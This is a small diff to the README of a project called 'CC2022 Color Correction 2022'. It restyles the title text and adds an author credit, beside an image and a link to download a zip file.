@@ -1,7 +1,8 @@
 <img src="https://cdn.pixabay.com/photo/2018/09/11/14/49/moe-3669736_1280.png" alt="CC2022" align="left" width="100" height="130">
 
 # 𝗖𝗖𝟮𝟬𝟮𝟮
-> ᴄᴏʟᴏʀ ᴄᴏʀʀᴇᴄᴛɪᴏɴ 2022
+> **Color Correction 2022**
+> *Created by Yusuf*
 
 ### [`𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗`](https://github.com/avianz37/CC/raw/main/ArdanPcrLana.zip) ᴠᴇʀꜱɪ ᴛᴇʀʙᴀʀᴜ
 
